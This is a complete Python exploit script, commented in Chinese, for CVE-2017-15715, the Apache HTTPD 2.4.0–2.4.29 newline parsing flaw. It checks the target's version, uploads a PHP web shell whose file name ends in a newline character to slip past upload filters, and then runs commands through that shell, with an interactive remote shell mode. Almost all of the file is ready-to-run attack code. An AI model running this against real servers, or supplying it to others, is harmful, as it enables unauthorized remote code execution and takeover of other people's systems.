import requests
import argparse
import sys
import urllib.parse

"""
CVE-2017-15715 — Apache HTTPD 2.4.0~2.4.29 换行解析漏洞
通过上传文件名末尾添加 \\x0A 绕过安全策略，Apache 仍按 PHP 解析
"""

WEB_SHELL_CODE = '<?php system($_GET["c"]); ?>'
WEB_SHELL_PARAM = "c"

VULN_VERSIONS = (
    "Apache/2.4.0", "Apache/2.4.1", "Apache/2.4.2", "Apache/2.4.3",
    "Apache/2.4.4", "Apache/2.4.6", "Apache/2.4.7", "Apache/2.4.9",
    "Apache/2.4.10", "Apache/2.4.12", "Apache/2.4.16", "Apache/2.4.17",
    "Apache/2.4.18", "Apache/2.4.20", "Apache/2.4.23", "Apache/2.4.25",
    "Apache/2.4.27", "Apache/2.4.28", "Apache/2.4.29",
)


def check_version(target: str) -> dict:
    """检查 Apache 版本"""
    try:
        r = requests.get(target, timeout=10)
        server = r.headers.get("Server", "")
        x_powered = r.headers.get("X-Powered-By", "")
        return {"server": server, "x_powered": x_powered, "status": r.status_code}
    except Exception as e:
        return {"error": str(e)}


def find_upload_form(target: str) -> str | None:
    """查找上传表单"""
    try:
        r = requests.get(target, timeout=10)
        if "multipart/form-data" in r.text:
            return r.text
        return None
    except Exception:
        return None


def upload_webshell(target: str, endpoint: str, shell_name: str,
                    field_name: str = "file", name_field: str = "name",
                    extra_fields: dict | None = None) -> tuple[bool, str]:
    """
    利用 \\x0A 绕过上传 webshell
    shell_name 末尾会被自动添加 \\x0A
    """
    # 构建绕过文件名: shell_name + \x0A
    bypass_name = shell_name + "\x0a"

    files = {field_name: (shell_name, WEB_SHELL_CODE, "application/x-php")}
    data = {name_field: bypass_name}
    if extra_fields:
        data.update(extra_fields)

    try:
        r = requests.post(f"{target}{endpoint}", files=files, data=data, timeout=15)
        # 空响应或非 "bad file" 即可能成功
        return ("bad file" not in r.text.lower() and "error" not in r.text.lower(), r.text[:500])
    except Exception as e:
        return (False, str(e))


def execute_cmd(target: str, shell_path: str, cmd: str) -> str:
    """通过 webshell 执行命令"""
    try:
        r = requests.get(f"{shell_path}", params={WEB_SHELL_PARAM: cmd}, timeout=15)
        return r.text
    except Exception as e:
        return f"[!] 执行失败: {e}"


def interactive_shell(target: str, shell_path: str):
    """交互式 shell"""
    print(f"\n[+] 进入交互式 shell, 输入 exit 退出")
    print(f"[+] 目标: {target}")
    print(f"[+] Shell: {shell_path}\n")

    while True:
        try:
            cmd = input("$ ").strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                print("[*] 退出 shell")
                break

            result = execute_cmd(target, shell_path, cmd)
            print(result)
        except KeyboardInterrupt:
            print("\n[*] 退出 shell")
            break
        except EOFError:
            break


def main():
    parser = argparse.ArgumentParser(description="CVE-2017-15715 Apache 换行解析漏洞利用")
    parser.add_argument("-u", "--url", required=True, help="目标 URL (如 http://10.16.1.211:88)")
    parser.add_argument("-e", "--endpoint", default="/", help="上传端点, 默认 /")
    parser.add_argument("-c", "--cmd", default="id", help="执行命令, 默认 id")
    parser.add_argument("-n", "--name", default="cve201715715", help="shell 文件名(不含后缀), 默认 cve201715715")
    parser.add_argument("-f", "--field", default="file", help="文件字段名, 默认 file")
    parser.add_argument("-N", "--name-field", default="name", help="文件名字段名, 默认 name")
    parser.add_argument("--shell", action="store_true", help="获取 shell 后进入交互模式")
    parser.add_argument("--check", action="store_true", help="仅检测不利用")
    parser.add_argument("--upload-only", action="store_true", help="仅上传不执行命令")
    args = parser.parse_args()

    target = args.url.rstrip("/")
    shell_name = f"{args.name}.php"

    # 1. 检查版本
    print("[*] 检查目标服务器...")
    info = check_version(target)
    if "error" in info:
        print(f"[-] 连接失败: {info['error']}")
        sys.exit(1)

    print(f"[*] Server: {info.get('server', 'Unknown')}")
    print(f"[*] X-Powered-By: {info.get('x_powered', 'Unknown')}")

    vulnerable = any(v in info.get("server", "") for v in VULN_VERSIONS)
    if vulnerable:
        print("[+] Apache 版本在漏洞影响范围内")
    else:
        print("[!] Apache 版本可能不在已知漏洞范围, 继续测试...")

    if args.check:
        print("[*] 检测模式, 仅探测版本...")
        return

    # 2. 上传 webshell
    print(f"\n[*] 上传 webshell: {shell_name} + \\x0A ...")
    success, response = upload_webshell(
        target, args.endpoint, shell_name,
        field_name=args.field, name_field=args.name_field
    )

    if not success:
        print(f"[-] 上传可能失败: {response}")
        sys.exit(1)

    print(f"[+] 上传请求完成")

    # 3. 构建访问路径
    # 文件名: cve201715715.php\x0A → URL: /cve201715715.php%0a
    encoded_name = urllib.parse.quote(shell_name + "\x0a")
    shell_url = f"{target}/{encoded_name}"

    if args.upload_only:
        print(f"[*] Shell URL: {shell_url}?{WEB_SHELL_PARAM}=whoami")
        return

    # 4. 执行命令验证
    print(f"\n[*] 测试命令执行: {args.cmd}")
    result = execute_cmd(target, shell_url, args.cmd)
    print(f"[+] 结果:\n{result}")

    print(f"\n[*] Shell URL: {shell_url}?{WEB_SHELL_PARAM}=whoami")

    # 5. 交互式 shell
    if args.shell:
        interactive_shell(target, shell_url)


if __name__ == "__main__":
    main()
